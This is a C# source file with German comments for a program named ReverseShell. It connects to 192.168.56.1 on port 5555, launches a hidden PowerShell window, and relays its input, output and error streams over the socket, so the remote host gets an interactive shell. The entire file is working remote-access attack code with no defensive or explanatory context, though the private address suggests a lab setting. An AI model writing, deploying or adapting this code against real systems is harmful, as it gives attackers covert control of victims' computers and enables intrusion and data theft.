﻿using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Threading;

class ReverseShell
{
    public static void Main(string[] args)
    {
        // IP-Adresse und Port des entfernten Rechners
        string ip = "192.168.56.1";
        int port = 5555;

        // Erstelle eine Tcp-Verbindung zum entfernten Rechner
        TcpClient client = new TcpClient(ip, port);

        // Hole die Netzwerkstream
        NetworkStream ns = client.GetStream();

        // Erstelle einen Prozess für die PowerShell
        Process p = new Process();
        p.StartInfo.FileName = "powershell.exe";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();

        // Hole die Standardausgabe der PowerShell
        StreamReader sOut = p.StandardOutput;

        // Hole die Standardeingabe der PowerShell
        StreamWriter sIn = p.StandardInput;

        // Hole die Fehlerausgabe der PowerShell
        StreamReader sErr = p.StandardError;

        // Erstelle einen Thread für die Eingabe
        Thread tIn = new Thread(() => {
            while (true)
            {
                // Sende die Eingabe zur PowerShell
                byte[] buffer = new byte[4096];
                int bytesRead = ns.Read(buffer, 0, buffer.Length);
                sIn.BaseStream.Write(buffer, 0, bytesRead);
                sIn.Flush();
            }
        });
        tIn.Start();

        // Erstelle einen Thread für die Ausgabe
        Thread tOut = new Thread(() => {
            while (true)
            {
                // Sende die Ausgabe zurück zum entfernten Rechner
                byte[] buffer = new byte[4096];
                int bytesRead = sOut.BaseStream.Read(buffer, 0, buffer.Length);
                ns.Write(buffer, 0, bytesRead);
            }
        });
        tOut.Start();

        // Erstelle einen Thread für die Fehlerausgabe
        Thread tErr = new Thread(() => {
            while (true)
            {
                // Sende die Fehlerausgabe zurück zum entfernten Rechner
                byte[] buffer = new byte[4096];
                int bytesRead = sErr.BaseStream.Read(buffer, 0, buffer.Length);
                ns.Write(buffer, 0, bytesRead);
            }
        });
        tErr.Start();
    }
}